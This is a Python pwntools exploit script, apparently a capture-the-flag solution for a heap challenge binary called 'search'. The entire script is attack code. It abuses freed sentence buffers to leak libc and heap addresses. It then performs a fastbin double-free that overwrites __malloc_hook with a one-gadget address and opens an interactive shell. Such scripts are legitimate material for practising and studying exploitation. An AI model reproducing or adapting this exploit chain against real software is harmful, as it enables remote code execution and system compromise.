#!/usr/bin/env python

from pwn import *

context.log_level = "debug"

p = process("./search")

def search(word, s):
    p.recvuntil("3: Quit\n")
    p.sendline("1")
    p.recvline("Enter the word size:")
    p.sendline(str(len(word)))
    p.recvline("Enter the word:")
    p.send(word)
    if (s != ""):
        p.sendline(str(s))
        return p.recvline()

def index(word):
    p.recvuntil("3: Quit\n")
    p.sendline("2")
    p.recvline("Enter the sentence size:")
    p.sendline(str(len(word)))
    p.send(word)

index("a "+"a"*14)
search("a", "y")
index("A"*0x80)
search("A"*0x80, "y")

libc_base = u64(search("\x78", "n")[10:18])-0x3c4b78
log.info("libc_base: " + hex(libc_base))

index("b "+"b"*14)
index("c "+"c"*14)
search("b", "y")
search("c", "y")

heap_base = u64(search("\x10", "n")[10:18])-0x1010
log.info("heap_base: " + hex(heap_base))

index("bbbb "+"b"*0x5b)
index("cccc "+"c"*0x5b)
index("dddd "+"d"*0x5b)
search("bbbb", "y")
search("cccc", "y")
search("dddd", "y")

search(p32(heap_base+0x11c0), "y")

# malloc_hook
payload = p64(libc_base+0x3c4aed)

# free hook
# payload = p64(libc_base+0x3c6795)
index(payload+p8(0)*0x58)
index("B"*0x60)
index("C"*0x60)

payload = p8(0)*3
payload += p64(0)*2
payload += p64(libc_base+0xcd0f3)
payload += "\x00"*(0x60-len(payload))
index(payload)

p.interactive()